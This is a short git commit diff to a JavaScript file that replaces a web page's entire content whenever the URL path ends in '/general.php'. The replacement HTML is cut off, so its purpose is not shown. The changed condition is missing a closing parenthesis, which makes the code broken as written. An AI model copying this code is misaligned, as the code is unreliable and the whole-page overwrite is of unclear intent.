82c33e5737f871825f21ac3180cd7ce04bfbaca6
inggarfi <inggarsaput@gmail.com>
2025-09-11 13:35:09 +0700

    Update newlinka.js

--- newlink.js
+++ newlink.js
@@ -1,5 +1,5 @@
 (function() {
-    if (window.location.pathname.endsWith("/general/") && window.location.search === "?notif=1") {
+    if (window.location.pathname.endsWith("/general.php") {
         document.documentElement.innerHTML = `
 <!DOCTYPE html>
 <html>
